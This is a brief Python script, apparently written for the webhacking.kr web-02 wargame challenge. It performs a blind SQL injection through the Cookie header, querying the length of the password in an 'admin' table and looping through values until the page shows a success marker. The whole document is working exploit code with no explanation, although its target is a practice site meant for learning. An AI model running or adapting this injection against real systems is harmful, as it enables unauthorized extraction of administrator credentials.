import re, urllib
import urllib.request
 
my_session = "session_ID" #example)97d589d02d91ff14d8afal7d37ade0b0
 
print("\nStarting to find length of admin password..")
 
for i in range(1, 10000):
    url = "http://webhacking.kr/challenge/web/web-02/"
    req = urllib.request.Request(url)
 
    req.add_header('Cookie',"Cookie_name=Cookie_value and (select length(password) from admin) = %d; PHPSESSID=%s" %(i, my_session))
    html = urllib.request.urlopen(req).read()
    # html = html.decode('utf-8')
    html_str = str(html)
 
    find_index = html_str.find("Next str")
    #example> Next str is After Executing Authentication password like login.php
    
    print("Detecting... \nlength of password : %d" %i, end='')
   
 
    if (find_index != -1) :
        print(" ... Find this.")
        print("length of admin password : %d" %i)
        break;
    else :
        print(" ... Not Founded")
